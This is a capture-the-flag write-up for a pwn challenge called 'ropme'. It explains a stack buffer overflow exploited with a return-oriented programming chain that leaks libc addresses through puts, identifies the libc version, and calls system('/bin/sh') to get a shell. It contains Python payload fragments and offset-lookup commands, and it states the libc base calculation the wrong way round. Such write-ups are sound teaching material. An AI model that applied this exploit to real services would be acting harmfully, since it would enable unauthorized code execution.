# ropme

>>> Can you pwn the service and get the flag? 

Starting off with the classic `checksec` shows us:

```
[*] '/root/Downloads/ropme/ropme'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE
```

NX enabled means no shellcode. Therefore, we're going to have to exploit with a `libc` exploit.

Using `pattern create X` we can see that the buffer is `72` bytes long. 

Assuming `alsr` is active on the server, we're going to have to bypass it by leaking addresses.
We can achive this by using the `puts@plt` to print the location of `puts@got`. This can then be used to calculate the location of `libc`.

Due to the binary being 64-bits we're going to have to place the argument in `rdi`. The binary contains a perfect gadget to achive this.

The first round of gadgets are arranged like so:

```python
payload = b""
payload += junk
payload += pop_rdi
payload += puts_got
payload += puts_plt
payload += main_adr

p.sendline(payload)
```

This will print out the address of `plt`. Due to us not knowing the `libc` version on the server, we need another leaked address to compare to, `fgets` is the example used in this exploit. This same ROP chain was greated for `fgets`.

This then allows us to us the [libc-database](https://github.com/niklasb/libc-database) repository to find the version of `libc` with the gap between these values.

Running:
```
./find fgets 0x7fdf868efad0 puts 0x7fdf868f1690
```

Produces:
```
ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu10_amd64)
archive-glibc (id libc6_2.23-0ubuntu11_amd64)
```

Either of these versions of `libc` can be used to extract the offsets.

The commands below are used to find strings (/bin/sh) or function addresses

```
readelf -s <LIBC_PATH> | grep <FUNCTION_NAME>
strings -a -t x <LIBC_PATH>
```

The base address for `libc` is calculated using the offset for `libc` version of `puts` minus the actual address of `puts` we leaked earlier.

This can subsequently be used to find the actual addresses of anything in the the version of `libc`. This can be used with ALSR on!

The final ROP chain calls the newly discovered value of `system` with the string value for `/bin/sh`.

```python
payload = b""
payload += junk
payload += pop_rdi
payload += bin_sh
payload += system
```